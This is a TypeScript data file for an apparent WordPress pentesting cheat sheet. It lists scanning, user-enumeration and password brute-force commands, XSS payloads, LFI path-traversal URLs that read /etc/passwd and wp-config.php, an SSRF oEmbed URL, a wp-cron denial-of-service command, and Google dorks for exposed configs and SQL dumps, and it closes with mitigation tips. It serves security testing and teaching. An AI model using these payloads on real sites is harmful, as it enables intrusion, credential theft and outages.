export interface WordPressCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-15"
export const pageDescription = "WordPress security testing with plugin/theme vulnerability detection and user enumeration."

export const wordpressCategories: WordPressCategory[] = [
  // =================== INTRODUCTION ==================
  {
    category: "Understanding WordPress Architecture",
    commands: [
      {
        command: "Core: Main WordPress files maintained by the community",
        description: "Core WordPress files - rarely the target",
      },
      {
        command: "Themes: Control design but often include PHP/JS code",
        description: "Themes can contain vulnerabilities",
      },
      {
        command: "Plugins: Extend functionality but biggest source of vulnerabilities",
        description: "Attackers usually target plugins, not core",
      },
      {
        command: "Attackers don't target WordPress core - they exploit poorly coded plugins or misconfigured themes",
        description: "Key insight for bug hunters",
      },
    ],
  },

  // =================== FILE/FOLDER HIERARCHY ==================
  {
    category: "WordPress File/Folder Hierarchy",
    commands: [
      {
        command: "/ (webroot)\n├─ index.php              # Loads WordPress environment\n├─ license.txt            # WordPress GPL license\n├─ readme.html            # Basic info about WP installation\n├─ wp-config.php          # Main configuration (DB, keys, salts)\n├─ wp-login.php           # User login & authentication\n├─ xmlrpc.php             # XML-RPC API endpoint\n├─ wp-admin/              # WordPress admin dashboard core\n├─ wp-includes/           # Core WordPress libraries & functions\n└─ wp-content/            # User content (safe to edit)\n   ├─ plugins/            # Installed plugins\n   ├─ themes/             # Installed themes\n   ├─ uploads/             # Media library (user uploaded files)\n   ├─ languages/           # Translation files\n   ├─ mu-plugins/          # Must-use plugins (auto-loaded)\n   ├─ cache/               # Cache files\n   └─ upgrade/             # Temporary files during updates",
        description: "Typical WordPress directory structure",
      },
    ],
  },

  // =================== ESSENTIAL TOOLS ==================
  {
    category: "Essential Tools 1: WPScan",
    commands: [
      {
        command: "wpscan --url https://domain.com --api-token YOUR_TOKEN",
        description: "Basic WPScan with API token for vulnerability data",
      },
      {
        command: "wpscan --url https://domain.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force",
        description: "Aggressive scan: all themes, all plugins, users",
      },
    ],
  },
  {
    category: "Essential Tools 2: Nmap",
    commands: [
      {
        command: "nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan",
        description: "Discover open ports and services",
      },
    ],
  },
  {
    category: "Essential Tools 3: DirBuster/ffuf",
    commands: [
      {
        command: "dirsearch -u https://example.com --full-url --deep-recursive -r",
        description: "Find hidden directories with dirsearch",
      },
      {
        command: "dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1",
        description: "Comprehensive dirsearch with all extensions",
      },
      {
        command: "ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\" -t 100 -r -o results.json",
        description: "Comprehensive ffuf directory bruteforce",
      },
      {
        command: "ffuf -w @coffin-payloads/coffin@wp-fuzz.txt -u https://target.com/FUZZ -fc 401,403,404 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H \"User-Agent: Mozilla/5.0\" -r -t 60 --rate 100 -c",
        description: "Fuzz with CoffinXP WordPress wordlist",
      },
      {
        command: "https://github.com/coffinxp/payloads/blob/main/coffin@wp-fuzz.txt",
        description: "CoffinXP WordPress fuzzing wordlist",
      },
    ],
  },

  // =================== USERNAME ENUMERATION ==================
  {
    category: "Username Enumeration via REST API",
    commands: [
      {
        command: "/wp-json/wp/v2/users",
        description: "#1 Default REST API endpoint to list users",
      },
      {
        command: "/wp-json/wp/v2/users/1",
        description: "#2 Direct user ID probing (start with 1)",
      },
      {
        command: "/wp-json/wp/v2/users/2",
        description: "#3 Continue enumerating user IDs",
      },
      {
        command: "/wp-json/?rest_route=/wp/v2/users/",
        description: "#4 Bypass with rest_route parameter",
      },
      {
        command: "/index.php?rest_route=/wp/v2/users",
        description: "#5 Bypass via index.php",
      },
      {
        command: "/wp-json/wp/v2/users?page=1",
        description: "#6 Paginated user listing",
      },
      {
        command: "/wp-json/wp/v2/users?search=admin",
        description: "#7 Search for specific username",
      },
      {
        command: "/wp-json/users",
        description: "#8 Alternative endpoint (older WP versions)",
      },
    ],
  },

  // =================== ADMIN PASSWORD BRUTEFORCE ==================
  {
    category: "Admin Panel Password Bruteforce",
    commands: [
      {
        command: "wpscan --url https://target.com --username admin --passwords /path/to/passwords.txt --disable-tls-checks",
        description: "#1 WPScan brute force with single username",
      },
      {
        command: "wpscan --url https://target.com --usernames /path/to/usernames.txt --passwords /path/to/passwords.txt --disable-tls-checks",
        description: "#2 WPScan brute force with multiple usernames",
      },
      {
        command: "wpscan --url https://target.com --usernames admin --passwords /path/to/passwords.txt --disable-tls-checks --max-threads 10",
        description: "#3 WPScan brute force via XML-RPC",
      },
    ],
  },

  // =================== EXPOSED CONFIG FILES ==================
  {
    category: "Exposed 1: Configuration Files",
    commands: [
      {
        command: "/wp-config.php",
        description: "#1 Main WordPress configuration file",
      },
      {
        command: "/wp-config.php.bak",
        description: "#2 Backup of config file",
      },
      {
        command: "/wp-config.php.save",
        description: "#3 Saved version",
      },
      {
        command: "/wp-config.php.old",
        description: "#4 Old version",
      },
      {
        command: "/wp-config.php.orig",
        description: "#5 Original version",
      },
      {
        command: "/wp-config.php~",
        description: "#6 Tilde backup (Linux)",
      },
      {
        command: "/wp-config.php.txt",
        description: "#7 Exposed as text file",
      },
      {
        command: "/wp-config.php.zip",
        description: "#8 Compressed config",
      },
    ],
  },
  {
    category: "Exposed 2: Environment Files",
    commands: [
      {
        command: "/.env",
        description: "#1 Environment variables file",
      },
      {
        command: "/.env.bak",
        description: "#2 Env backup",
      },
      {
        command: "/.env.old",
        description: "#3 Env old version",
      },
      {
        command: "/.env.save",
        description: "#4 Env saved version",
      },
      {
        command: "/.env.example",
        description: "#5 Example env file",
      },
      {
        command: "/.env.local",
        description: "#6 Local env file",
      },
    ],
  },
  {
    category: "Exposed 3: Backup & Archive Files",
    commands: [
      {
        command: "/backup.zip",
        description: "#1 Site backup archive",
      },
      {
        command: "/backup.tar.gz",
        description: "#2 Compressed tar backup",
      },
      {
        command: "/db.sql",
        description: "#3 Database dump",
      },
      {
        command: "/database.sql",
        description: "#4 Database export",
      },
      {
        command: "/dump.sql",
        description: "#5 SQL dump file",
      },
      {
        command: "/wordpress.zip",
        description: "#6 Full WordPress archive",
      },
    ],
  },

  // =================== EXPOSED REGISTRATION ==================
  {
    category: "Exposed Registration Page",
    commands: [
      {
        command: "/wp-login.php?action=register",
        description: "If registration enabled, attackers can create accounts without restrictions",
      },
      {
        command: `id: wp-login-register-detect
info:
  name: Detect WordPress Registration Page
  author: yourname
  severity: info
  description: Checks for WordPress user registration endpoint exposure
requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-login.php?action=register"
    matchers:
      - type: word
        words:
          - 'user_login'
          - 'user_email'
        condition: and
      - type: status
        status:
          - 200`,
        description: "Nuclei template to detect registration page",
      },
    ],
  },

  // =================== UNSECURED SETUP WIZARD ==================
  {
    category: "Unsecured WordPress Setup Wizard",
    commands: [
      {
        command: "/wp-admin/setup-config.php?step=1",
        description: "WordPress setup wizard - can expose DB config form",
      },
      {
        command: "https://github.com/coffinxp/nuclei-templates/blob/main/wp-setup-config.yaml",
        description: "Nuclei template for setup config detection",
      },
    ],
  },

  // =================== EXPLOITING ADMIN-AJAX ==================
  {
    category: "Exploiting 1: Admin-AJAX XSS",
    commands: [
      {
        command: "domain.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options={'location':'Cairo','units':'C','forecast_days':'5</script><script>alert(document.domain)</script>custom_name':'Cairo','animated':'true'}",
        description: "#1 XSS via admin-ajax.php with unescaped options",
      },
      {
        command: "domain.com/wp-content/themes/ambience/thumb.php?src=<body onload=prompt(1)>.png",
        description: "#2 XSS via theme thumb.php with src parameter",
      },
    ],
  },
  {
    category: "Exploiting 2: RCE & LFI",
    commands: [
      {
        command: "https://domain.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd",
        description: "#1 LFI via mail-masta plugin",
      },
      {
        command: "http://target.com/index.php?page=about.php",
        description: "#2 LFI basic attempt",
      },
      {
        command: "http://target.com/index.php?page=../../../../etc/passwd",
        description: "#3 LFI with path traversal",
      },
      {
        command: "http://target.com/wp-content/themes/twentytwenty/page.php?file=../../../../wp-config.php",
        description: "#4 LFI targeting wp-config.php via theme",
      },
      {
        command: "http://target.com/wp-content/plugins/plugin-name/download.php?file=../../../../wp-config.php",
        description: "#5 LFI via plugin download function",
      },
      {
        command: "https://github.com/coffinxp/payloads/blob/main/lfi.txt",
        description: "CoffinXP LFI payload wordlist",
      },
    ],
  },

  // =================== WP-CRON DOS ==================
  {
    category: "Abusing wp-cron.php for Denial of Service",
    commands: [
      {
        command: "./doser -t 100000 -g \"https://target.com/wp-cron.php\"",
        description: "DoS via wp-cron.php (causes high server load)",
      },
      {
        command: "return a 500 Internal Server Error upon refresh, the DoS issue is confirmed",
        description: "How to confirm the DoS vulnerability",
      },
      {
        command: "https://github.com/Quitten/doser.go",
        description: "Go-based DoS tool for WordPress",
      },
    ],
  },

  // =================== DEBUG LOG ==================
  {
    category: "Exposed WordPress Debug Log",
    commands: [
      {
        command: "https://target.com/wp-content/debug.log",
        description: "Debug log may expose sensitive PHP errors and paths",
      },
    ],
  },

  // =================== INSTALLATION SCRIPT ==================
  {
    category: "WordPress Installation Script",
    commands: [
      {
        command: "https://target.com/wp-admin/install.php",
        description: "If accessible, attackers can reinstall WordPress with their own DB credentials",
      },
    ],
  },

  // =================== WORDPRESS SSRF ==================
  {
    category: "WordPress SSRF",
    commands: [
      {
        command: "https://target.com/wp-json/oembed/1.0/proxy?url=<attacker-controlled-url>",
        description: "SSRF via oEmbed proxy endpoint",
      },
      {
        command: "Impact: Internal network scanning, accessing cloud metadata (AWS/GCP), leaking sensitive data from internal services",
        description: "Potential SSRF impacts",
      },
      {
        command: "https://github.com/coffinxp/nuclei-templates/blob/main/wordpress-takeover.yaml",
        description: "Nuclei template for WordPress takeover/SSRF",
      },
    ],
  },

  // =================== DIRECTORY LISTING ==================
  {
    category: "Directory Listing Enabled",
    commands: [
      {
        command: "https://target.com/wp-content/uploads/",
        description: "#1 May reveal media assets, documents, or user uploads",
      },
      {
        command: "https://target.com/wp-content/plugins/",
        description: "#2 Could expose plugin files, outdated versions, or config details",
      },
      {
        command: "https://target.com/wp-content/themes/",
        description: "#3 May allow attackers to inspect theme files, templates",
      },
      {
        command: "https://target.com/wp-includes/",
        description: "#4 Often exposes core PHP files and scripts",
      },
      {
        command: "https://target.com/wp-content/backup/",
        description: "#5 May leak archived site data or database exports",
      },
      {
        command: "https://target.com/wp-admin/backup/",
        description: "#6 Backups in admin directories can be discovered",
      },
    ],
  },

  // =================== GOOGLE DORKS ==================
  {
    category: "Google Dorks 1: Finding WordPress Sites",
    commands: [
      {
        command: "site:target.com inurl:wp-content",
        description: "#1 Find WordPress sites by wp-content path",
      },
      {
        command: "site:target.com inurl:wp-admin",
        description: "#2 Find WordPress admin panels",
      },
      {
        command: "site:target.com \"Powered by WordPress\"",
        description: "#3 Find by WordPress footer text",
      },
    ],
  },
  {
    category: "Google Dorks 2: Version Detection",
    commands: [
      {
        command: "inurl:readme.html \"WordPress\"",
        description: "#1 Find readme.html for version info",
      },
      {
        command: "inurl:/wp-includes/js/wp-embed.min.js",
        description: "#2 Find by embed script (version in file)",
      },
      {
        command: "site:target.com \"WordPress\" \"version\"",
        description: "#3 Search for version mentions",
      },
    ],
  },
  {
    category: "Google Dorks 3: Vulnerable Plugins",
    commands: [
      {
        command: "inurl:wp-content/plugins/plugin-name",
        description: "#1 Find specific plugin paths",
      },
      {
        command: "site:target.com inurl:wp-content/plugins \"index of\"",
        description: "#2 Find plugins with directory listing enabled",
      },
      {
        command: "site:target.com \"wp-content/plugins\" + \"vulnerable-plugin-name\"",
        description: "#3 Find sites using vulnerable plugins",
      },
    ],
  },
  {
    category: "Google Dorks 4: Vulnerable Themes",
    commands: [
      {
        command: "inurl:wp-content/themes/theme-name",
        description: "#1 Find specific theme paths",
      },
      {
        command: "site:target.com inurl:wp-content/themes \"index of\"",
        description: "#2 Find themes with directory listing",
      },
      {
        command: "site:target.com \"wp-content/themes\" + \"vulnerable-theme-name\"",
        description: "#3 Find sites using vulnerable themes",
      },
    ],
  },
  {
    category: "Google Dorks 5: Login Pages",
    commands: [
      {
        command: "inurl:wp-login.php",
        description: "#1 Find WordPress login pages",
      },
      {
        command: "intitle:\"WordPress › Login\"",
        description: "#2 Find by login page title",
      },
      {
        command: "site:target.com inurl:wp-admin/admin-ajax.php",
        description: "#3 Find admin-ajax endpoint",
      },
    ],
  },
  {
    category: "Google Dorks 6: Config Files",
    commands: [
      {
        command: "inurl:wp-config.php",
        description: "#1 Find exposed wp-config.php",
      },
      {
        command: "site:target.com ext:txt \"wp-config\"",
        description: "#2 Find config mentions in text files",
      },
      {
        command: "site:target.com ext:log \"wordpress\"",
        description: "#3 Find WordPress mentions in log files",
      },
    ],
  },
  {
    category: "Google Dorks 7: Backup Files",
    commands: [
      {
        command: "inurl:wp-content backup.zip",
        description: "#1 Find backup.zip in wp-content",
      },
      {
        command: "site:target.com ext:sql \"wordpress\"",
        description: "#2 Find SQL dumps mentioning WordPress",
      },
      {
        command: "site:target.com ext:bak \"wp-config\"",
        description: "#3 Find .bak files with wp-config",
      },
    ],
  },
  {
    category: "Google Dorks 8: Database Dumps",
    commands: [
      {
        command: "site:target.com ext:sql \"INSERT INTO wp_users\"",
        description: "#1 Find SQL dumps with wp_users table",
      },
      {
        command: "site:target.com \"database dump\" \"wordpress\"",
        description: "#2 Find database dump mentions",
      },
    ],
  },
  {
    category: "Google Dorks 9: Error Messages",
    commands: [
      {
        command: "site:target.com \"Fatal error\" \"wordpress\"",
        description: "#1 Find fatal errors mentioning WordPress",
      },
      {
        command: "site:target.com \"WordPress database error\"",
        description: "#2 Find database errors",
      },
    ],
  },
  {
    category: "Google Dorks 10: Sensitive Information",
    commands: [
      {
        command: "site:target.com Index of /wp-admin",
        description: "#1 Find open directory listing for wp-admin",
      },
      {
        command: "site:target.com \"index of\" /wp-content/uploads/",
        description: "#2 Find uploads directory listing",
      },
      {
        command: "site:target.com inurl:wp-json/wp/v2/users",
        description: "#3 Find REST API user endpoint",
      },
      {
        command: "site:target.com \"xmlrpc.php\"",
        description: "#4 Find XML-RPC endpoint",
      },
    ],
  },
  {
    category: "Google Dorks 11: Directory Listings",
    commands: [
      {
        command: "site:target.com intitle:\"index of\" wp-includes",
        description: "#1 Find wp-includes directory listing",
      },
      {
        command: "site:target.com intitle:\"index of\" wp-content",
        description: "#2 Find wp-content directory listing",
      },
    ],
  },
  {
    category: "Google Dorks Reference",
    commands: [
      {
        command: "https://wpscan.com/wordpresses/",
        description: "WPScan WordPress vulnerability database",
      },
    ],
  },

  // =================== PREVENTION ==================
  {
    category: "Prevention and Mitigation",
    commands: [
      {
        command: "#1: Keep WordPress, Plugins & Themes Updated",
        description: "Regularly patching reduces exposure to known CVEs and zero-days",
      },
      {
        command: "#2: Remove Unused Plugins & Themes",
        description: "Every plugin is an extra attack surface - delete what you don't use",
      },
      {
        command: "#3: Limit Access to Sensitive Files & Endpoints",
        description: "Block public access to /wp-config.php, .env, .htaccess, /xmlrpc.php, /wp-admin/, /wp-cron.php",
      },
      {
        command: "#4: Enforce Strong Authentication",
        description: "Use strong, unique passwords and enable 2FA for all admin accounts",
      },
      {
        command: "#5: Rate Limiting & WAF",
        description: "Protect against brute force, XML-RPC abuse, and DoS with rate limiting or WAF (Cloudflare, ModSecurity)",
      },
      {
        command: "#6: Secure Backups",
        description: "Ensure backups are stored outside web root and not publicly accessible",
      },
      {
        command: "#7: Subdomain & DNS Hygiene",
        description: "Regularly audit DNS records to prevent subdomain takeover risks",
      },
    ],
  },
]

export const wordpressTools = [
  {
    name: "WPScan",
    url: "https://wpscan.com/",
    description: "Gold standard for WordPress enumeration (plugins, themes, users, vulnerabilities)",
  },
  {
    name: "Nuclei Templates",
    url: "https://github.com/coffinxp/nuclei-templates",
    description: "CoffinXP Nuclei templates for WordPress vulnerabilities",
  },
  {
    name: "CoffinXP Payloads",
    url: "https://github.com/coffinxp/payloads",
    description: "WordPress fuzzing wordlists and LFI payloads",
  },
  {
    name: "WPScan Vulnerability DB",
    url: "https://wpscan.com/wordpresses/",
    description: "Official WordPress vulnerability database",
  },
  {
    name: "DoSer Tool",
    url: "https://github.com/Quitten/doser.go",
    description: "Go-based DoS tool for WordPress wp-cron.php",
  },
]
